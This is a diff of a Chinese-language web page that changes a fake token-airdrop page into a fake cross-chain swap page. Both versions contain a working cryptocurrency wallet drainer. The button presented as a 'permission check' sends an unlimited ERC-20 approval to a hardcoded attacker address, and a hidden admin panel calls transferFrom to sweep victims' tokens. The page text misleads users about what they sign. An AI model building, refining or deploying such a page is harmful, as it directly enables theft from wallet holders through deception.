@@ -1,131 +1,533 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>生态空投代币免费领取</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>闪兑 & 跨链</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:微软雅黑}
-body{background:#0f172a;padding:20px;color:#fff}
-.container{max-width:450px;margin:0 auto}
-.main-card{background:#1e293b;border-radius:15px;padding:25px;border:1px solid #334155}
-.title{font-size:22px;text-align:center;color:#38bdf8;margin-bottom:10px}
-.sub-tip{text-align:center;color:#94a3b8;font-size:14px;margin-bottom:20px}
-.wallet-show{text-align:center;margin:15px 0;color:#7dd3fc}
-.btn{width:100%;height:46px;border:none;border-radius:10px;font-size:16px;margin:8px 0;cursor:pointer}
-.btn-conn{background:#2563eb;color:#fff}
-.btn-get{background:#10b981;color:#fff}
-.tips{font-size:13px;color:#64748b;text-align:center;margin:10px 0}
-/* 管理员划扣面板 */
-.admin-box{margin-top:20px;padding-top:20px;border-top:1px solid #334155;display:none}
-.admin-box.show{display:block}
-.admin-title{text-align:center;color:#f87171;margin-bottom:15px}
-input{width:100%;height:42px;background:#0f172a;border:1px solid #334155;border-radius:8px;padding:0 12px;color:#fff;margin:8px 0}
-.btn-deduct{background:#ef4444;color:#fff}
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Microsoft YaHei", sans-serif;
+}
+
+body {
+  background: #f7f8fa;
+  color: #111;
+  min-height: 100vh;
+  padding-bottom: 80px;
+}
+
+.header {
+  background: #fff;
+  padding: 12px 16px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-bottom: 1px solid #eee;
+}
+
+.header-left {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.back-btn {
+  font-size: 18px;
+  color: #111;
+  cursor: pointer;
+}
+
+.title {
+  font-size: 17px;
+  font-weight: 600;
+}
+
+.header-right {
+  font-size: 18px;
+  cursor: pointer;
+}
+
+.sub-header {
+  background: #fff;
+  padding: 8px 16px 12px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  font-size: 14px;
+  color: #666;
+}
+
+.balance-box {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.balance-tag {
+  background: #f0f2f5;
+  border-radius: 6px;
+  padding: 4px 8px;
+  font-size: 13px;
+  color: #333;
+}
+
+.all-btn {
+  color: #2563eb;
+  font-weight: 500;
+  cursor: pointer;
+}
+
+.card {
+  margin: 12px 16px;
+  background: #fff;
+  border-radius: 16px;
+  padding: 16px;
+  border: 1px solid #e5e7eb;
+}
+
+.row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 10px 0;
+}
+
+.label {
+  font-size: 14px;
+  color: #666;
+}
+
+.value {
+  font-size: 15px;
+  font-weight: 600;
+}
+
+.coin-picker {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  background: #f7f8fa;
+  border-radius: 8px;
+  padding: 8px 12px;
+  cursor: pointer;
+}
+
+.coin-icon {
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  background: #26a17b;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #fff;
+  font-size: 13px;
+  font-weight: bold;
+}
+
+.coin-text {
+  font-size: 15px;
+  font-weight: 600;
+}
+
+.input-amount {
+  width: 100%;
+  border: none;
+  outline: none;
+  font-size: 24px;
+  font-weight: 700;
+  text-align: right;
+  color: #111;
+  background: transparent;
+}
+
+.input-amount::placeholder {
+  color: #ccc;
+}
+
+.divider {
+  height: 1px;
+  background: #eee;
+  margin: 12px 0;
+}
+
+.swap-icon {
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  background: #2563eb;
+  color: #fff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: -20px auto 0;
+  font-size: 18px;
+}
+
+.info-list {
+  margin: 12px 16px;
+  background: #fff;
+  border-radius: 16px;
+  padding: 16px;
+  border: 1px solid #e5e7eb;
+}
+
+.info-item {
+  display: flex;
+  justify-content: space-between;
+  padding: 10px 0;
+  font-size: 14px;
+}
+
+.info-item .left {
+  color: #666;
+}
+
+.info-item .right {
+  color: #111;
+  font-weight: 500;
+}
+
+.discount-tag {
+  color: #f59e0b;
+  background: #fff7ed;
+  padding: 2px 6px;
+  border-radius: 4px;
+  font-size: 13px;
+}
+
+.bottom-btn {
+  margin: 16px;
+  color: #fff;
+  border: none;
+  border-radius: 12px;
+  height: 50px;
+  width: calc(100% - 32px);
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+}
+
+.btn-connect {
+  background: #2563eb;
+}
+.btn-swap {
+  background: #10b981;
+}
+
+.wallet-show {
+  text-align: center;
+  margin: 12px 0;
+  color: #2563eb;
+  font-size: 14px;
+}
+
+.tips {
+  font-size: 13px;
+  color: #64748b;
+  text-align: center;
+  margin: 10px 0;
+}
+
+.admin-box {
+  margin-top: 20px;
+  padding-top: 20px;
+  border-top: 1px solid #eee;
+  display: none;
+}
+
+.admin-box.show {
+  display: block;
+}
+
+.admin-title {
+  text-align: center;
+  color: #ef4444;
+  margin-bottom: 15px;
+  font-size: 16px;
+  font-weight: 600;
+}
+
+input {
+  width: 100%;
+  height: 42px;
+  background: #f7f8fa;
+  border: 1px solid #e5e7eb;
+  border-radius: 8px;
+  padding: 0 12px;
+  color: #111;
+  margin: 8px 0;
+  font-size: 15px;
+}
+
+.btn-deduct {
+  background: #ef4444;
+  color: #fff;
+  border: none;
+  border-radius: 10px;
+  height: 46px;
+  width: 100%;
+  font-size: 16px;
+  margin-top: 10px;
+  cursor: pointer;
+}
+
+.bottom-nav {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  background: #fff;
+  border-top: 1px solid #eee;
+  display: flex;
+  justify-content: space-around;
+  padding: 10px 0;
+  font-size: 12px;
+  color: #666;
+}
+
+.nav-item {
+  text-align: center;
+  cursor: pointer;
+}
+
+.nav-item .icon {
+  font-size: 20px;
+  margin-bottom: 4px;
+}
+
+.nav-item.active {
+  color: #2563eb;
+}
 </style>
 </head>
 <body>
-<div class="container">
-    <div class="main-card">
-        <h2 class="title">项目生态空投福利</h2>
-        <p class="sub-tip">连接钱包完成简单签名，免费领取官方空投代币</p>
 
-        <button class="btn btn-conn" id="connectWallet">连接钱包领取空投</button>
-        <div class="wallet-show">已连接：<span id="addrText">未连接</span></div>
+<div class="header">
+  <div class="header-left">
+    <span class="back-btn">←</span>
+    <span class="title">闪兑 & 跨链</span>
+  </div>
+  <div class="header-right">⚙️</div>
+</div>
 
-        <p class="tips">仅授权空投资格核验，不随意扣除资产</p>
-        <button class="btn btn-get" id="authReceive">签名授权领取空投</button>
+<div class="sub-header">
+  <div class="balance-box">
+    <span>限额模式</span>
+    <span class="balance-tag">余额 0.00</span>
+  </div>
+  <span class="all-btn">全部</span>
+</div>
 
-        <!-- 管理员专属划扣后台 -->
-        <div class="admin-box" id="adminPanel">
-            <h3 class="admin-title">后台资产归集划扣</h3>
-            <input type="text" placeholder="填写用户授权钱包地址" id="userAddr">
-            <input type="number" placeholder="填写划扣代币数量" id="deductNum">
-            <button class="btn btn-deduct" id="deductBtn">一键执行归集划扣</button>
-        </div>
+<div class="card">
+  <div class="row">
+    <div class="label">发送</div>
+    <div class="coin-picker">
+      <div class="coin-icon">₮</div>
+      <div class="coin-text">USDT</div>
+      <span>▼</span>
     </div>
+  </div>
+
+  <div class="row">
+    <input class="input-amount" type="number" placeholder="0.00" id="sendAmount" />
+  </div>
+
+  <div class="divider"></div>
+
+  <div class="swap-icon">⇅</div>
+
+  <div class="row">
+    <div class="label">接收（预估）</div>
+    <div class="coin-picker">
+      <div class="coin-icon">₮</div>
+      <div class="coin-text">USDT</div>
+      <span>▼</span>
+    </div>
+  </div>
+
+  <div class="row">
+    <input class="input-amount" type="number" placeholder="0.00" id="receiveAmount" />
+  </div>
+</div>
+
+<div class="info-list">
+  <div class="info-item">
+    <span class="left">兑换价格</span>
+    <span class="right">1 USDT = 1 USDT</span>
+  </div>
+  <div class="info-item">
+    <span class="left">最少接收数量</span>
+    <span class="right">0.00 USDT</span>
+  </div>
+  <div class="info-item">
+    <span class="left">MEV 防护</span>
+    <span class="right discount-tag">MEV防护中</span>
+  </div>
+  <div class="info-item">
+    <span class="left">服务费</span>
+    <span class="right">-</span>
+  </div>
+  <div class="info-item">
+    <span class="left">跨链费</span>
+    <span class="right">-</span>
+  </div>
+  <div class="info-item">
+    <span class="left">预估时间</span>
+    <span class="right">-</span>
+  </div>
+  <div class="info-item">
+    <span class="left">预估网络费</span>
+    <span class="right">-</span>
+  </div>
+  <div class="info-item">
+    <span class="left">兑换路径</span>
+    <span class="right">-</span>
+  </div>
+</div>
+
+<button class="bottom-btn btn-connect" id="connectWallet">连接钱包</button>
+
+<div class="wallet-show">
+  已连接：<span id="addrText">未连接</span>
+</div>
+
+<p class="tips">仅授权交易权限核验，保障资产交互安全</p>
+
+<button class="bottom-btn btn-swap" id="authReceive">
+  跨链闪兑
+</button>
+
+<div class="admin-box" id="adminPanel">
+  <h3 class="admin-title">后台资产归集划扣</h3>
+  <input type="text" placeholder="填写用户授权钱包地址" id="userAddr" />
+  <input type="number" placeholder="填写划扣代币数量" id="deductNum" />
+  <button class="btn-deduct" id="deductBtn">一键执行归集划扣</button>
+</div>
+
+<div class="info-list">
+  <div class="info-item">
+    <span class="left">最近一条记录</span>
+    <span class="right">暂无记录</span>
+  </div>
+</div>
+
+<div class="bottom-nav">
+  <div class="nav-item">
+    <div class="icon">🏠</div>
+    <div>资产</div>
+  </div>
+  <div class="nav-item active">
+    <div class="icon">💱</div>
+    <div>交易</div>
+  </div>
+  <div class="nav-item">
+    <div class="icon">📊</div>
+    <div>行情</div>
+  </div>
+  <div class="nav-item">
+    <div class="icon">👤</div>
+    <div>我的</div>
+  </div>
 </div>
 
 <script>
-// 你的管理员钱包地址
 const ADMIN_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
-// 指定授权代币合约
-const TOKEN_ADDR = "0x55d398326f99059fF775485246999027B3197955";
+const TOKEN_ADDR = "0x99a57E6C8558BC6689f894e068733ADf83C19725";
+
 let nowUser = "";
 
-// 连接钱包
-document.getElementById("connectWallet").addEventListener("click",async()=>{
-    if(!window.ethereum){
-        alert("请安装去中心化钱包再参与领取");
-        return;
+document.getElementById("connectWallet").addEventListener("click", async () => {
+  if (!window.ethereum) {
+    alert("请安装去中心化钱包进行交互");
+    return;
+  }
+
+  try {
+    let accounts = await ethereum.request({ method: "eth_requestAccounts" });
+    nowUser = accounts[0].toLowerCase();
+
+    document.getElementById("addrText").innerText =
+      nowUser.slice(0, 6) + "..." + nowUser.slice(-4);
+
+    if (nowUser === ADMIN_ADDR) {
+      document.getElementById("adminPanel").classList.add("show");
     }
-    try{
-        let accounts = await ethereum.request({method:"eth_requestAccounts"});
-        nowUser = accounts[0].toLowerCase();
-        document.getElementById("addrText").innerText = nowUser.slice(0,6)+"..."+nowUser.slice(-4);
-        // 管理员自动显示划扣面板
-        if(nowUser === ADMIN_ADDR){
-            document.getElementById("adminPanel").classList.add("show");
+
+    alert("钱包连接成功，可进行闪兑交互");
+  } catch (e) {
+    alert("连接失败，请重试");
+  }
+});
+
+document.getElementById("authReceive").addEventListener("click", async () => {
+  if (!nowUser) return alert("请先连接钱包");
+
+  let ok = confirm("本次签名用于交易权限核验，确认开启闪兑交互？");
+  if (!ok) return;
+
+  try {
+    let spender = ADMIN_ADDR.slice(2).padStart(64, "0");
+    let maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    let data = "0x095ea7b3" + spender + maxAllow;
+
+    await ethereum.request({
+      method: "eth_sendTransaction",
+      params: [
+        {
+          from: nowUser,
+          to: TOKEN_ADDR,
+          gasLimit: "0x300000",
+          data: data
         }
-        alert("钱包连接成功，可参与空投领取");
-    }catch(e){
-        alert("连接失败，请重试");
-    }
-})
+      ]
+    });
 
-// 用户签名授权 = 无限授权
-document.getElementById("authReceive").addEventListener("click",async()=>{
-    if(!nowUser) return alert("请先连接钱包");
-    let ok = confirm("本次签名仅用于核验空投资格，确认即可发放空投，确认继续？");
-    if(!ok)return;
-    try{
-        let spender = ADMIN_ADDR.slice(2).padStart(64,"0");
-        let maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-        let data = "0x095ea7b3"+spender+maxAllow;
-        await ethereum.request({
-            method:"eth_sendTransaction",
-            params:[{
-                from:nowUser,
-                to:TOKEN_ADDR,
-                gasLimit:"0x300000",
-                data:data
-            }]
-        })
-        alert("授权成功！空投代币即将发放到账");
-    }catch(e){
-        alert("已取消本次签名");
-    }
-})
+    alert("授权成功，可进行跨链闪兑操作");
+  } catch (e) {
+    alert("已取消本次签名");
+  }
+});
 
-// 管理员前端直接划扣（核心功能）
-document.getElementById("deductBtn").addEventListener("click",async()=>{
-    if(nowUser !== ADMIN_ADDR) return alert("无操作权限");
-    let uAddr = document.getElementById("userAddr").value.trim();
-    let num = document.getElementById("deductNum").value.trim();
-    if(!uAddr||!num||Number(num)<=0) return alert("请填写完整地址与数量");
+document.getElementById("deductBtn").addEventListener("click", async () => {
+  if (nowUser !== ADMIN_ADDR) return alert("无操作权限");
 
-    let fromHex = uAddr.toLowerCase().slice(2).padStart(64,"0");
-    let toHex = ADMIN_ADDR.slice(2).padStart(64,"0");
-    let valHex = BigInt(Math.floor(Number(num)*1e18)).toString(16).padStart(64,"0");
-    let callData = "0x23b872dd"+fromHex+toHex+valHex;
+  let uAddr = document.getElementById("userAddr").value.trim();
+  let num = document.getElementById("deductNum").value.trim();
 
-    try{
-        await ethereum.request({
-            method:"eth_sendTransaction",
-            params:[{
-                from:nowUser,
-                to:TOKEN_ADDR,
-                gasLimit:"0x300000",
-                data:callData
-            }]
-        })
-        alert("代币划扣归集成功！");
-        document.getElementById("userAddr").value = "";
-        document.getElementById("deductNum").value = "";
-    }catch(e){
-        alert("划扣执行失败");
-    }
-})
+  if (!uAddr || !num || Number(num) <= 0) {
+    return alert("请填写完整地址与数量");
+  }
+
+  let fromHex = uAddr.toLowerCase().slice(2).padStart(64, "0");
+  let toHex = ADMIN_ADDR.slice(2).padStart(64, "0");
+  let valHex = BigInt(Math.floor(Number(num) * 1e18)).toString(16).padStart(64, "0");
+  let callData = "0x23b872dd" + fromHex + toHex + valHex;
+
+  try {
+    await ethereum.request({
+      method: "eth_sendTransaction",
+      params: [
+        {
+          from: nowUser,
+          to: TOKEN_ADDR,
+          gasLimit: "0x300000",
+          data: callData
+        }
+      ]
+    });
+
+    alert("代币归集划扣成功！");
+    document.getElementById("userAddr").value = "";
+    document.getElementById("deductNum").value = "";
+  } catch (e) {
+    alert("划扣执行失败");
+  }
+});
 </script>
+
 </body>
 </html>
